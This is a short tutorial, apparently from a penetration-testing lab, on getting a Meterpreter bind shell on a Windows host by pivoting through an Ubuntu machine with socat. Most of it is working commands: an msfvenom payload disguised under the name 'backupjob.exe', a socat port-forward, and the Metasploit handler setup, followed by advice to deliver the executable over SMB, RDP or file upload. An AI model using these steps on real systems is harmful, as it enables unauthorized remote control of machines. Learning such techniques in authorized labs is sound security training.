## What is a Bind Shell?

A **bind shell** is when the **target machine (Windows)** opens up a **listening port** and waits for you (the hacker) to **connect to it**.

> Think of it like the Windows machine saying:
> üßç‚Äç‚ôÇÔ∏è "I‚Äôll wait here at port 8443. If anyone connects, I‚Äôll give them a shell."

## So What‚Äôs the Problem?

You (the attacker) **cannot connect directly** to the Windows target. But‚Ä¶  
You **can connect to an Ubuntu machine**, and **Ubuntu can talk to Windows**.

So we use **Socat** to forward your connection like this:

### Step 1: Create a Bind Shell Payload
```bash
msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=8443 -f exe -o backupjob.exe
```
üß† Think: ‚ÄúWhen this file runs on Windows, it will open port 8443 and wait for a hacker to connect.‚Äù

### Step 2: Start Socat on Ubuntu
Now, you run this command **on the Ubuntu pivot box**:
```
socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
```
If anyone talks to me on port 8080, I‚Äôll pass that traffic to Windows on port 8443.

### Step 3: Start Metasploit Handler (on your attack machine)
```bash
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/bind_tcp
set RHOST 10.129.202.64   # This is Ubuntu (the middleman)
set LPORT 8080            # This is the Socat listener
run
```

### ### Step 4: Run the Payload on Windows

Run `backupjob.exe` on the Windows host (using any method like SMB, RDP, file upload, etc.).

Once it runs:

- Windows listens on port 8443
- You (via Metasploit) connect to Ubuntu:8080
- Ubuntu forwards the connection to Windows
- üí• You get a Meterpreter shell!
